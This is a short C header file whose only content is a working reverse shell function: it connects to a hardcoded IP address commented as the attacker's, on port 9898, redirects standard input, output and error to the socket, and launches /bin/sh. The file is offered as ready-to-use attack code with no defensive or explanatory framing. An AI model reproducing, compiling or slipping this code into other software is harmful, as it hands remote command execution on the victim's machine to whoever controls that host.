#ifndef REVERSE_SHELL_H
#define REVERSE_SHELL_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

// Reverse Shell Setup Function
void reverse_shell() {
    const char *RHOST = "64.227.158.217";  // attacker's IP
    const int RPORT = 9898;             //  port                     // 

    int sock;
    struct sockaddr_in server;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Could not create socket");
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(RPORT);
    server.sin_addr.s_addr = inet_addr(RHOST);

    // Connect to the remote host
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connect failed");
        exit(1);
    }

    // Redirect input/output
    dup2(sock, 0);  // stdin
    dup2(sock, 1);  // stdout
    dup2(sock, 2);  // stderr

    // Spawn a shell
    char *const args[] = {"/bin/sh", NULL};
    execvp(args[0], args);

    // Cleanup
    close(sock);
}

#endif // REVERSE_SHELL_H
